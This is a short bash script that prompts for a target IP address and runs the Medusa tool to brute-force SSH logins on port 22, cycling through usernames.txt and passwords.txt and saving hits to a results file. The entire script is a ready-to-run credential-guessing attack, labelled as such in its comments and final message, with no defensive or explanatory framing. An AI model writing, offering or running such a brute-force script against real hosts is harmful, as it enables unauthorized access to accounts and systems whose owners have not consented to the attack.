#!/bin/bash

# Ask for the target IP address
echo "Enter the target IP address:"
read TARGET_IP


# SSH runs on on port 22
PORT=22

# Username and password files
USERNAME_FILE="usernames.txt"
PASSWORD_FILE="passwords.txt"

# Service to attack (e.g., ssh, ftp)
SERVICE="ssh"

# Running Medusa
medusa -h "$TARGET_IP" -U "$USERNAME_FILE" -P "$PASSWORD_FILE" -M "$SERVICE" -n $PORT > medusa_output.txt

echo "Medusa attack complete. Check medusa_output.txt for results."
